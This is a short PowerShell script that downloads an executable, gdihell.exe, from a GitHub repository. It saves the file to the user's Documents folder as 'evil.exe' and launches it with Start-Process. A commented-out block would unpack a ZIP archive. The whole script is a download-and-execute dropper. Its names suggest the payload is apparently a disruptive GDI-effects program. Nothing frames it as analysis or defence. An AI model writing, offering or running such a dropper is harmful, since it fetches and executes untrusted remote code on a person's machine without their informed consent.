$url = "https://github.com/ChyppitauCoder/34-GDI-effects-in-repository/raw/refs/heads/main/gdihell.exe"
$destination = "$env:USERPROFILE\Documents\evil.exe"
Invoke-WebRequest -Uri $url -OutFile $destination



#Extract the ZIP file:
#$zipPath = "$env:USERPROFILE\Documents\evil.zip"
#$extractPath = "$env:USERPROFILE\Documents\evil"
#Expand-Archive -Path $zipPath -DestinationPath $extractPath -F

#Run the EXE file:
$exePath = "$env:USERPROFILE\Documents\evil.exe"
Start-Process -FilePath $exePath